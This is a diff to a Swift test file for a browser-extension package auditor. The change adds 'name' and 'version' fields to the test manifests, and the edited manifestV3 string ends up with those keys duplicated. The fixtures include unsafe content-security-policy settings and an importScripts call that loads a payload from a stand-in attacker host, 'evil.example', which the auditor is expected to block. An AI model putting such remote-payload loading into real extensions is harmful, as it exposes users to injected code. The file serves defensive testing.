@@ -41,7 +41,7 @@ private struct ZipBuilder {
     private func le32(_ v: UInt32) -> Data { Data((0..<4).map { UInt8((v >> (8 * $0)) & 0xFF) }) }
 }
 
-private let manifestV3 = #"{"manifest_version": 3, "name": "Test", "version": "1.0", "permissions": ["storage"]}"#
+private let manifestV3 = #"{"name": "T", "version": "1", "manifest_version": 3, "name": "Test", "version": "1.0", "permissions": ["storage"]}"#
 
 @Suite struct ExtensionPackageTests {
     @Test func crcMatchesTheStandardCheckValue() {
@@ -122,18 +122,18 @@ private let manifestV3 = #"{"manifest_version": 3, "name": "Test", "version": "1
     }
 
     @Test func remoteCodeBlocksInstallation() throws {
-        #expect(try audit(#"{"manifest_version": 2, "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'"}"#).isBlocked)
-        #expect(try audit(#"{"manifest_version": 2, "content_security_policy": "script-src 'self' https://cdn.example.com"}"#).isBlocked)
-        #expect(try audit(#"{"manifest_version": 3, "content_security_policy": {"extension_pages": "script-src 'self' 'unsafe-inline'"}}"#).isBlocked)
+        #expect(try audit(#"{"name": "T", "version": "1", "manifest_version": 2, "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'"}"#).isBlocked)
+        #expect(try audit(#"{"name": "T", "version": "1", "manifest_version": 2, "content_security_policy": "script-src 'self' https://cdn.example.com"}"#).isBlocked)
+        #expect(try audit(#"{"name": "T", "version": "1", "manifest_version": 3, "content_security_policy": {"extension_pages": "script-src 'self' 'unsafe-inline'"}}"#).isBlocked)
         #expect(try audit(manifestV3, ["popup.html": #"<script src="https://cdn.example.com/lib.js"></script>"#]).isBlocked)
         #expect(try audit(manifestV3, ["bg.js": #"importScripts("https://evil.example/payload.js")"#]).isBlocked)
         #expect(try audit("not json").isBlocked)
     }
 
     @Test func riskyButCommonPatternsAreWarnings() throws {
-        let sandbox = try audit(#"{"manifest_version": 3, "content_security_policy": {"sandbox": "sandbox allow-scripts; script-src 'self' 'unsafe-eval'"}}"#)
+        let sandbox = try audit(#"{"name": "T", "version": "1", "manifest_version": 3, "content_security_policy": {"sandbox": "sandbox allow-scripts; script-src 'self' 'unsafe-eval'"}}"#)
         #expect(!sandbox.isBlocked && sandbox.findings.contains { $0.severity == .warning })
-        let code = try audit(#"{"manifest_version": 3, "permissions": ["cookies", "history"], "host_permissions": ["<all_urls>"], "update_url": "https://clients2.google.com/service/update2/crx"}"#,
+        let code = try audit(#"{"name": "T", "version": "1", "manifest_version": 3, "permissions": ["cookies", "history"], "host_permissions": ["<all_urls>"], "update_url": "https://clients2.google.com/service/update2/crx"}"#,
                              ["bg.js": "const f = eval(x); fetch('https://www.google-analytics.com/collect'); fetch('https://api.example.net/v1')"])
         let titles = Set(code.findings.map(\.title))
         #expect(!code.isBlocked)
@@ -155,7 +155,7 @@ private let manifestV3 = #"{"manifest_version": 3, "name": "Test", "version": "1
 
     /// `wasm-unsafe-eval` is MV3's allowed way to run WebAssembly, not general eval.
     @Test func wasmUnsafeEvalIsAllowed() throws {
-        #expect(try !audit(#"{"manifest_version": 3, "content_security_policy": {"extension_pages": "script-src 'self' 'wasm-unsafe-eval'"}}"#).isBlocked)
+        #expect(try !audit(#"{"name": "T", "version": "1", "manifest_version": 3, "content_security_policy": {"extension_pages": "script-src 'self' 'wasm-unsafe-eval'"}}"#).isBlocked)
     }
 }
 
